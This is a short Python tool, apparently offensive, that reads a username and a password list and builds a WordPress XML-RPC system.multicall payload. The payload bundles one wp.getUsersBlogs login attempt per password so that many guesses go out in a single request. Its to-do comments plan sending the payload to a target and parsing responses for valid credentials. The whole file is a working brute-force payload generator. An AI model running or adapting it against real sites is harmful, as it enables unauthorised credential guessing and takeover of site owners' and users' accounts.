# Standard imports
import sys

# Local imports
from argparser import argumentHandler
import utils

# Print banner
utils.printBanner()


# Parse arguments
args = sys.argv
args = argumentHandler(args[1::])


# Assign variables
username = args.USERNAME
file = args.PASSLIST
text = file.readlines()

# Make list of passwords from PASSLIST for iteration
passwords = [i.rstrip('\n') for i in text]

# Print the top of the xmlrpc payload
payload = "<?xml version=\"1.0\"?>\n<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>\n"

# Add as many methods as there are passwords from PASSLIST
for i in passwords:
    payload += f'\n<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{username}</string></value><value><string>{i}</string></value></data></array></value></data></array></value></member></struct></value>\n'
# Add the closing tags for payload
payload += "\n</data></array></value></param></params></methodCall>"

# Optional write payload to file
if args.output is not None:
    with open(args.output, 'w') as f:
        f.write(payload)
        print(f'\toutput payload to {f.name}...')
else:
    print(payload)


''' To do:

 > implement interaction with host given by user -- an optional argument. The user may want to copy and paste it into
   something like BurpSuite

 > parse response and check for valid credentials. Output whether or not there were any.
 
 > Valid credentials can be written to the bottom of the given output file (if specified) to make for easy reading.
   It will regardless be output to standard output
   
'''